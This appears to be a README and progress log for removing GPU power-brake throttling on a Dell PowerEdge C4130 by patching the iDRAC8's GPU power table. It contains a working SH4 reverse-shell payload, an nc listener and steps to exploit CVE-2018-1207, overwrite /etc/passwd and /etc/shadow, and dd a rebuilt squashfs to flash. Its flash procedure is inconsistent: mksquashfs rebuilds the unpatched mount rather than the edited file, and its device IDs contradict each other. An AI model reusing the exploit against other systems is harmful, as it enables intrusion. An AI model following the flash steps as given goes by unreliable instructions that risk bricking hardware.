# Dell PowerEdge C4130 — V100 SXM2 32GB GPU Throttle Fix

Fixing `HW Power Brake Slowdown: Active` on 4× Tesla V100-SXM2-32GB in a C4130.

Credit for the original reverse-engineering technique: [l4rz](https://l4rz.net/dell-idrac-reverse-engineering/) — this repo documents applying and automating that technique.

---

## The Problem

The C4130 iDRAC8 does not recognize the 32GB variant of the V100 SXM2 by default. When it cannot match a GPU's PCI IDs against its internal power table, it asserts the `PWR_BRAKE_N` hardware signal, throttling all four GPUs to ~25% of rated clock speed.

```
Clocks Throttle Reasons
    HW Slowdown                       : Active
        HW Power Brake Slowdown       : Active

Clocks
    SM                                : 382 MHz   ← should be ~1530 MHz
```

**Root cause:** The GPU PCI IDs for V100-SXM2-32GB (`VID=0x10DE DID=0x1DB5 SVID=0x10DE SDID=0x1249`) are absent from the iDRAC's internal GPGPU power table. The 16GB variant (`DID=0x1DB1 SDID=0x1212`) is in the table and works fine. This has nothing to do with PSU wattage, BIOS version, or cabling.

---

## System Configuration

| Item | Value |
|---|---|
| Server | Dell PowerEdge C4130, Config K (NVLink interposer) |
| GPUs | 4× Tesla V100-SXM2-32GB |
| iDRAC | iDRAC8 Enterprise, firmware **2.50.50.50** |
| Service Tag | <SERVICE_TAG> |
| iDRAC IP | 192.168.1.100 |
| Host OS | Linux 6.17, Ubuntu/Mint base |
| iDRAC users | root (id 2), admin (id 3), tech (id 5) — all ADMINISTRATOR |
| SH4 toolchain | `gcc-sh4-linux-gnu` — already installed on host |

---

## The Fix — Overview

The iDRAC stores its GPU power table in a config group (`group 20033`). One line change via `writecfg` inside the iDRAC Linux shell makes it recognize the V100-SXM2-32GB and stop asserting the power brake.

There are three levels of fix, in increasing permanence:

| Level | Method | Survives server reboot | Survives iDRAC reboot |
|---|---|---|---|
| Volatile | `writecfg` in iDRAC shell | ✓ | ✗ |
| Semi-persistent | `writecfg` + bind-mount of patched `platcfgfld.txt` | ✗ (iDRAC reboots with server) | ✗ |
| **Permanent** | Patch `/dev/mmcblk0p9` squashfs on iDRAC | ✓ | ✓ |

The bind-mount approach **was successfully applied in a previous session** — the GPUs unthrottled and `BIND_ACTIVE` was confirmed — but the iDRAC restarted together with the GracefulRestart server reboot and the patch was lost.

**Target: the permanent `/dev/mmcblk0p9` patch.**

---

## Prerequisites

### 1. iDRAC firmware must be < 2.52.52.52

The CVE-2018-1207 exploit (used to gain root iDRAC shell) only works below 2.52.52.52. This system is at **2.50.50.50** — exploitable.

If the iDRAC has been upgraded to 2.52.52.52+, downgrade first:
```
# Via Redfish from host OS:
curl -k -s -u 'root:<PASSWORD>' -X POST \
  https://192.168.1.100/redfish/v1/UpdateService/Actions/UpdateService.SimpleUpdate \
  -H 'Content-Type: application/json' \
  -d '{"ImageURI":"http://<your-server>/iDRAC-with-Lifecycle-Controller_Firmware_JWKMP_LN_2.50.50.50_A00.BIN","TransferProtocol":"HTTP"}'
```
The 2.50.50.50 BIN is at `~/Downloads/iDRAC-with-Lifecycle-Controller_Firmware_JWKMP_LN_2.50.50.50_A00.BIN`.

### 2. iDRAC reachable with credentials

Verify:
```bash
curl -k -s -u 'root:<PASSWORD>' https://192.168.1.100/redfish/v1/Managers/iDRAC.Embedded.1 \
  -w '\nHTTP %{http_code}' | tail -1
# → HTTP 200
```

### 3. SH4 cross-compiler (for exploit payload)

```bash
dpkg -l | grep sh4
# gcc-sh4-linux-gnu is already installed
```

---

## Step 1 — Get iDRAC root shell via CVE-2018-1207

### 1a. Build the SH4 reverse-shell payload

The exploit loads a `.so` into the iDRAC process via a path traversal in the CGI handler. The payload must be compiled for SH4 (Renesas SH7758 = iDRAC8's CPU) and hard-coded with the callback IP.

Create `payload.c` on the host:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

static void __attribute__((constructor)) pwn(void) {
    int sock;
    struct sockaddr_in sa;
    char *const argv[] = {"/bin/sh", NULL};

    sock = socket(AF_INET, SOCK_STREAM, 0);
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(CALLBACK_PORT);          /* set at compile time */
    inet_aton(CALLBACK_IP, &sa.sin_addr);          /* set at compile time */

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
        execv("/bin/sh", argv);
    }
}
```

Compile (replace `192.168.1.101` and port `4444` with your values):
```bash
sh4-linux-gnu-gcc -shared -fPIC -nostartfiles \
  -DCALLBACK_IP='"192.168.1.101"' -DCALLBACK_PORT=4444 \
  -o payload.so payload.c
```

### 1b. Run the exploit

On the host, in one terminal start the listener:
```bash
nc -lvnp 4444
```

In another terminal, trigger the exploit (adapt the Python PoC for CVE-2018-1207 from https://github.com/KrE80r/PoC-CVE-2018-1207):
```bash
python3 exploit.py --target 192.168.1.100 --payload payload.so
```

### 1c. Upgrade to a proper SSH session

In the netcat shell (which is noisy and limited):
```sh
# Change clpd shell to /bin/sh in /etc/passwd
cd /tmp
sed 's/\/usr\/bin\/clpd/\/bin\/sh/g' < /etc/passwd > p2
cat p2 > /etc/passwd

# Set su password to something known (hash for "example")
sed 's/\$1\$REDACTED_ORIG_HASH/\$1\$REDACTED_NEW_HASH/g' \
  < /etc/shadow > s2
cat s2 > /etc/shadow
```

Now SSH in with the proper shell:
```bash
sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no \
  -o PreferredAuthentications=password root@192.168.1.100
# once in: su  (password: <LOCAL_PW>)
```

---

## Step 2 — Apply the volatile fix (verify it works)

With the system **powered but OS shut down** (GPUs enumerated by iDRAC, not yet booted into OS):

```sh
# In iDRAC shell:
readcfg -g20033 | grep -i "b5\|1db5\|GPGPU_9"
# Should NOT show DID=1db5 yet (that's our target)

writecfg -r'@@20033:90:1' -v'05 05 DE 10 B5 1D DE 10 49 12 B8 0B B8 0B 01 FF 48'

# Verify:
readcfg -g20033 | grep GPGPU_92
# → GPGPU_92_1=5 5 de 10 b5 1d de 10 49 12 b8 b b8 b 1 ff 48
```

What the value encodes:
```
05 05        — width=5, slot=5
DE 10        — VID  = 0x10DE (NVIDIA)
B5 1D        — DID  = 0x1DB5 (V100-SXM2-32GB)
DE 10        — SVID = 0x10DE
49 12        — SDID = 0x1249
B8 0B        — PeakPwr      = 0x0BB8 = 3000 → 300W
B8 0B        — ThrottledPwr = 0x0BB8 = 3000 → 300W
01           — gpuHotSup = 1
FF           — gpuDCT = 255
48           — flags
```

Now power on the server OS (do NOT reboot the iDRAC):
```bash
# From host:
curl -k -s -u 'root:<PASSWORD>' \
  -X POST https://192.168.1.100/redfish/v1/Systems/System.Embedded.1/Actions/ComputerSystem.Reset \
  -H 'Content-Type: application/json' \
  -d '{"ResetType":"On"}' -w '\nHTTP %{http_code}'
```

After boot, verify on the host OS:
```bash
nvidia-smi -q | grep "HW Power Brake"
# → HW Power Brake Slowdown : Not Active  ← success
```

---

## Step 3 — Apply the PERMANENT fix

This patches `/dev/mmcblk0p9` on the iDRAC — the squashfs partition that contains `platcfgfld.txt`. This survives iDRAC reboots and firmware-level resets.

**Do this while the volatile fix (Step 2) is active and the system is running.**

```sh
# In iDRAC shell:

# Mount the squashfs partition to inspect it
mkdir -p /tmp/sq_orig /tmp/sq_rw
mount -t squashfs /dev/mmcblk0p9 /tmp/sq_orig

# Copy platcfgfld.txt to writable tmpfs
cp /tmp/sq_orig/ipmi/Trailbreaker/platcfgfld.txt /tmp/platcfgfld.txt

# Find and replace the entry for V100-SXM2-16GB (line with DID=1db1 SDID=1212)
# and change it to the 32GB variant, OR add a new entry for the 32GB variant
# The key bytes: b5 1d = DID 0x1DB5, 49 12 = SDID 0x1249

grep -n "b3 1d\|ba 1d\|b5 1d" /tmp/platcfgfld.txt
# Identify the line to patch (typically entry 90/91/92)

# Patch in-place (sed example — match the 16GB BA entry and replace with B5):
sed -i 's/5 5 de 10 ba 1d de 10 1a 12 b8 b b8 b 1 ff 48/5 5 de 10 b5 1d de 10 49 12 b8 b b8 b 1 ff 48/' \
  /tmp/platcfgfld.txt

# Rebuild the squashfs (must use mksquashfs with matching options)
mksquashfs /tmp/sq_orig /tmp/new.sqfs -noappend -comp xz

# !! WARNING: the next command writes directly to flash !!
# Verify size is <= original before proceeding:
ls -la /tmp/new.sqfs
blockdev --getsize64 /dev/mmcblk0p9

# Write back:
dd if=/tmp/new.sqfs of=/dev/mmcblk0p9 bs=4096
sync
```

> **Note:** `mksquashfs` may not be available on iDRAC. If not, unsquash on the host, patch there, resquash with the SH4 toolchain's `mksquashfs`, SCP back, and write via dd.

---

## Step 4 — After permanent patch: full iDRAC reboot test

```bash
# Reboot iDRAC only (not the server OS):
curl -k -s -u 'root:<PASSWORD>' \
  -X POST https://192.168.1.100/redfish/v1/Managers/iDRAC.Embedded.1/Actions/Manager.Reset \
  -H 'Content-Type: application/json' \
  -d '{"ResetType":"GracefulRestart"}' -w '\nHTTP %{http_code}'

# Wait ~2 min for iDRAC to come back, then verify:
nvidia-smi -q | grep "HW Power Brake"
# → HW Power Brake Slowdown : Not Active  ← permanent fix confirmed
```

---

## What Did NOT Work (for reference)

### Bind-mount approach (volatile, not persistent)
Patching `platcfgfld.txt` in tmpfs and bind-mounting it over `/flash/pd0/ipmi/Trailbreaker/platcfgfld.txt` successfully showed `BIND_ACTIVE` in readcfg and cleared the power brake — BUT the iDRAC restarts along with the server on a GracefulRestart, wiping the bind mount.

### `pm_power_update.sh` / `poweroem.conf` approach
The file `/flash/data0/persmod/poweroem.conf` is on a writable flash partition and is read by `pm_power_update.sh` on iDRAC boot. Populating it with the correct entry *should* be persistent. However, `IPMICmd` returned an error status when this was attempted. The correct format for this file is not yet determined.

### PSU swap (not the cause)
The power brake is triggered by an unrecognized GPU PCI ID, not by insufficient PSU wattage. Confirmed: SW Power Cap remains `Not Active` throughout. The existing 1600W PSUs are adequate for the idle/light-load conditions used for LLM inference on this machine.

---

## GPU Clocks After Fix

```
Clocks
    SM          : 1530 MHz   ← full speed
    Memory      : 877 MHz

HW Power Brake Slowdown : Not Active
```

---

## Session History / Progress Log

| Date | Action | Result |
|---|---|---|
| 2026-06-xx | Got iDRAC root shell via CVE-2018-1207 | ✓ |
| 2026-06-xx | writecfg patch + bind-mount of platcfgfld.txt | ✓ BIND_ACTIVE confirmed |
| 2026-06-xx | GracefulRestart via Redfish | iDRAC also rebooted → patch lost |
| 2026-06-26 | Session resumed — volatile fix needs re-applying | ← current state |

**Next action:** Re-run exploit → `writecfg` → permanent `/dev/mmcblk0p9` patch.

---

## Quick Reference Commands

```bash
# From host OS — check GPU throttle state
nvidia-smi -q | grep "HW Power Brake"

# From host OS — check iDRAC firmware version
curl -k -s -u 'root:<PASSWORD>' https://192.168.1.100/redfish/v1/Managers/iDRAC.Embedded.1 \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['FirmwareVersion'])"

# From iDRAC shell — read GPGPU power table
readcfg -g20033

# From iDRAC shell — write V100-32GB entry
writecfg -r'@@20033:90:1' -v'05 05 DE 10 B5 1D DE 10 49 12 B8 0B B8 0B 01 FF 48'

# From iDRAC shell — verify
readcfg -g20033 | grep GPGPU_92

# From host — power on server (not reboot):
curl -k -s -u 'root:<PASSWORD>' \
  -X POST https://192.168.1.100/redfish/v1/Systems/System.Embedded.1/Actions/ComputerSystem.Reset \
  -H 'Content-Type: application/json' -d '{"ResetType":"On"}' -w '\nHTTP %{http_code}'

# From host — graceful restart server:
curl -k -s -u 'root:<PASSWORD>' \
  -X POST https://192.168.1.100/redfish/v1/Systems/System.Embedded.1/Actions/ComputerSystem.Reset \
  -H 'Content-Type: application/json' -d '{"ResetType":"GracefulRestart"}' -w '\nHTTP %{http_code}'
```
